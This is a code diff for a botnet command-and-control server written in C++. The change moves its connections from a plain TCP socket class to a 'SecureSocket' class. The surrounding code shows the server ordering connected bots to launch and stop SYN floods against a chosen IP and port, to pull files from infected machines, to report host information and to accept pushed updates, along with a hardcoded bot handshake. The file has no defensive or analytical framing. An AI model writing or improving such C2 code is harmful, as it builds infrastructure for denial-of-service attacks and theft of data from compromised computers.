@@ -51,13 +51,13 @@ void BotnetServer::GetMessages() {
 void BotnetServer::GetConnections() {
 	// Make a socket set containing only the
 	// lister to use its select function
-	Socket_Set<tcpSocket> listener_set(Socket_Set<tcpSocket>::READ);
+	Socket_Set<SecureSocket> listener_set(Socket_Set<SecureSocket>::READ);
 	listener_set.AddSocket(this->MainSocket);
 
 	// deque containing only the listener,
 	// returned by listener_set's Select function
-	std::deque<tcpSocket> listener_queue;
-	tcpSocket tmpSocket;
+	std::deque<SecureSocket> listener_queue;
+	SecureSocket tmpSocket;
 
 	// Continue serving until asked to shut down by user
 	while (this->continue_serving) {
@@ -113,7 +113,7 @@ void BotnetServer::KeepAlive() {
 	}
 }
 
-bool BotnetServer::AuthenticateBot(const tcpSocket& connection) {
+bool BotnetServer::AuthenticateBot(const SecureSocket& connection) {
 	/* Authentication: Send the bot "666", expect to receive "999" in return */
 	int try_cnt = 0;
 	bool sent = false;
@@ -248,7 +248,7 @@ void BotnetServer::SYNFlood() {
 	port_to_flood = htons(this->ReadPort());
 
 	// Send flood command to chosen connected bot, or all bots if bot_id == ALL_BOTS
-	for (const tcpSocket& bot : GetBotQueue()) {
+	for (const SecureSocket& bot : GetBotQueue()) {
 		if ((bot_id == ALL_BOTS || bot_id == bot.GetSockId()) && bot.isConnected()) {
 			if (bot.Send(&syn_flood_code, sizeof(char)) == sizeof(char) &&
 				bot.Send(IP_to_send, INET_ADDRSTRLEN) &&
@@ -266,7 +266,7 @@ void BotnetServer::StopFlood() {
 	bot_id = this->ReadID();
 
 	// Send stop-flood command to chosen connected bot, or all bots if bot_id == ALL_BOTS
-	for (const tcpSocket& bot : GetBotQueue()) {
+	for (const SecureSocket& bot : GetBotQueue()) {
 		if ((bot_id == ALL_BOTS || bot_id == bot.GetSockId()) && bot.isConnected()) {
 			bot.Send(&stop_flood_code, sizeof(char));
 		}
@@ -287,7 +287,7 @@ void BotnetServer::GetInfo() {
 	ThreadSafeLogPrintAlways(GetSepperator() + "\n");
 
 	// Send get_info command to chosen connected bot, or all bots if bot_id == ALL_BOTS
-	for (const tcpSocket& bot : GetBotQueue()) {
+	for (const SecureSocket& bot : GetBotQueue()) {
 		if ((bot_id == ALL_BOTS || bot_id == bot.GetSockId()) && bot.isConnected()) {
 			if (bot.Send(&get_info_code, sizeof(char)) == sizeof(char)) {
 				int retv = bot.Recv(info, MAX_INFO_SIZE);
@@ -318,7 +318,7 @@ void BotnetServer::GetFile() {
 	ThreadSafeLogPrintAlways("Enter path to try to get:\n");
 	file_path = ThreadSafeGetLine();
 	
-	for (const tcpSocket& bot : GetBotQueue()) {
+	for (const SecureSocket& bot : GetBotQueue()) {
 		if (bot_id == bot.GetSockId() && bot.isConnected()) {
 			if (bot.Send(&get_file_code, sizeof(char)) == sizeof(char) &&
 				bot.Send(file_path) == static_cast<int>(file_path.length()))
@@ -396,7 +396,7 @@ void BotnetServer::UpdateBot() {
 	}
 
 	// Send update_bot_code command to chosen connected bot, or all bots if bot_id == ALL_BOTS
-	for (const tcpSocket& bot : GetBotQueue()) {
+	for (const SecureSocket& bot : GetBotQueue()) {
 		if ((bot_id == ALL_BOTS || bot_id == bot.GetSockId()) && bot.isConnected()) {
 			if (bot.Send(&update_bot_code, sizeof(char)) == sizeof(char)) {
 
@@ -442,7 +442,7 @@ void BotnetServer::UpdateBot() {
 
 /* Botnet commands helpers */
 
-void BotnetServer::GetFileFrom(const tcpSocket& bot, const std::string& file_path) {
+void BotnetServer::GetFileFrom(const SecureSocket& bot, const std::string& file_path) {
 
 	// alias BOT_FILE_UPLOAD_DIR for esthetic of code
 	static const std::string upload_dir = botnet_defines::BOT_FILE_UPLOAD_DIR;
@@ -534,7 +534,7 @@ std::string BotnetServer::GetNewFileName(const std::string& file_path) {
 	return new_file_path;
 }
 
-void BotnetServer::RemoveBot(const tcpSocket& bot_to_remove) {
+void BotnetServer::RemoveBot(const SecureSocket& bot_to_remove) {
 	bot_to_remove.Close();
 	std::lock_guard<std::mutex> master_set_lg(master_set_lock);
 	this->master_set.RemoveSocket(bot_to_remove);
@@ -640,7 +640,7 @@ uint16_t BotnetServer::ReadPort() {
 	}
 }
 
-std::deque<tcpSocket> BotnetServer::GetBotQueue() {
+std::deque<SecureSocket> BotnetServer::GetBotQueue() {
 	std::lock_guard<std::mutex> master_set_lg(master_set_lock);
 	return master_set.GetAllSockets();
 }
@@ -653,12 +653,12 @@ std::string BotnetServer::GetSepperator() const {
 	int terminal_width = terminal_size.ws_col;
 
 	// Don't print more then terminal width (-2 for the '<' and '>')
-	size_t dash_times = terminal_width > 17 ? 15 : terminal_width - 2;
+	int dash_times = terminal_width > 17 ? 15 : terminal_width - 2;
 	
 	std::string Sepperator;
 
 	Sepperator += "<";
-	for (size_t i = 0; i < dash_times; i++) {
+	for (int i = 0; i < dash_times; i++) {
 		Sepperator += "-";
 	}
 	Sepperator += ">\n";
